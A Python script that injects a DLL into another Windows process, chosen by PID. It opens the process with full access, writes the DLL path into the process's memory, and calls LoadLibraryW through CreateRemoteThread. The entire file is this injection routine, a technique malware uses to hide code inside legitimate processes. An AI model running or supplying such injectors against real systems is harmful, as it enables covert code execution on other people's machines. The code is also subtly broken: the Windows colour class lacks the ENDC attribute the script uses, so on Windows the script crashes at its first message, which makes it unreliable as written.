import os
import sys
import ctypes


# Color
class WindowsColors:
    GREEN = 0x0A
    RED = 0x0C
    YELLOW = 0x0E
    RESET = 0x07


class LinuxColors:
    GREEN = "\033[92m"
    RED = "\033[91m"
    YELLOW = "\033[93m"
    ENDC = "\033[0m"


def main():
    if os.name == "nt":
        Colors = WindowsColors
    else:
        Colors = LinuxColors

    k = f"{Colors.GREEN}[+]{Colors.ENDC}"
    e = f"{Colors.RED}[-]{Colors.ENDC}"
    i = f"{Colors.YELLOW}[*]{Colors.ENDC}"

    rBuffer = None
    hKernel32 = None
    PID = None
    TID = None
    hProcess = None
    hThread = None

    dllPath = os.path.join(os.getcwd(), "example.dll")

    if len(sys.argv) < 2:
        print(f"{e} Usage: {sys.argv[0]} <PID>")
        return

    PID = int(sys.argv[1])

    print(f"{i} Trying to get a handle to the process ({PID})")

    # get a handle to the process
    hProcess = ctypes.windll.kernel32.OpenProcess(
        ctypes.c_ulong(0x1F0FFF), False, PID)

    if hProcess == None:
        print(
            f"{e} Unable to get a handle to the process, error: {ctypes.windll.kernel32.GetLastError()}")
        return

    print(f"{k} Got a handle to the process\n\t\\---0x{hProcess:x}")

    # allocate to the process memory
    dllPath = dllPath.encode('utf-16le')  # Convert to UTF-16 little-endian
    rBuffer = ctypes.windll.kernel32.VirtualAllocEx(
        hProcess, None, len(dllPath), (0x1000 | 0x2000), 0x04)
    print(f"{k} Allocated rBuffer with PAGE_READWRITE permissions")

    # write to the process memory
    ctypes.windll.kernel32.WriteProcessMemory(
        hProcess, rBuffer, dllPath, len(dllPath), None)
    print(f"{k} Wrote [{dllPath.decode('utf-16le')}] to the process memory")

    # get a handle to Kernel32
    hKernel32 = ctypes.windll.kernel32.GetModuleHandleW("Kernel32")

    if hKernel32 == None:
        print(f"{e} Failed to get a handle to Kernel32.dll, error: {ctypes.windll.kernel32.GetLastError()}")
        return

    print(f"{k} Got a handle to Kernel32.dll\n\t\\---0x{hKernel32:x}")

    # get the address of LoadLibraryW() from Kernel32
    startThis = ctypes.windll.kernel32.GetProcAddress(
        hKernel32, "LoadLibraryW")
    print(f"{k} Got address of LoadLibraryW()\n\t\\---0x{startThis:x}")

    # create thread
    hThread = ctypes.windll.kernel32.CreateRemoteThread(
        hProcess, None, 0, startThis, rBuffer, 0, ctypes.byref(ctypes.c_ulong()))

    if hThread == None:
        print(
            f"{e} unable to create thread, error: {ctypes.windll.kernel32.GetLastError()}")
        ctypes.windll.kernel32.CloseHandle(hProcess)
        return

    # exit cleanly
    print(f"{k} Got a handle to the newly created thread ({ctypes.windll.kernel32.GetThreadId(hThread)})")
    print(f"{i} Waiting for thread to finish execution")

    ctypes.windll.kernel32.WaitForSingleObject(hThread, 0xFFFFFFFF)
    print(f"{k} Thread finished execution, cleaning up...")

    ctypes.windll.kernel32.CloseHandle(hThread)
    ctypes.windll.kernel32.CloseHandle(hProcess)

    print(f"{k} Finished, see you next time :x")


if __name__ == "__main__":
    main()
